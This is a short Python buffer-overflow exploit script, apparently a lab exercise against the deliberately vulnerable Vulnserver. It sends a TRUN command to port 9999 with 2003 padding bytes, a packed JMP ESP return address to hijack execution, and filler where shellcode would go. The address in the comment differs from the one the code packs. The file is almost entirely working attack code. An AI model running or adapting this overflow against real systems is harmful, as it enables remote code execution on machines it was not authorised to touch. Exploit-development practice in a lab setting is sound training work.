# Import the Socket python library for UDP and TCP socket communications
import socket
# Import Struct module to perform conversion from python to C style structures
import struct
# Import Sys python library so we can use the CLI arguments
import sys

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 adress of the target machine")
    exit(1)

# Set Consts for use later. 
HOST = sys.argv[1]
PORT = 9999

# Generate payload, this includes a packed ROP (Encoded) 
# so we can change the control flow of the program
PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 2003 +
    # 62501205   FFE4             JMP ESP
    # This also packs it as little endian, in unsigned long
    struct.pack('<L', 0x6250151e) +
    b'C' * (5000 - 2003 - 4)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)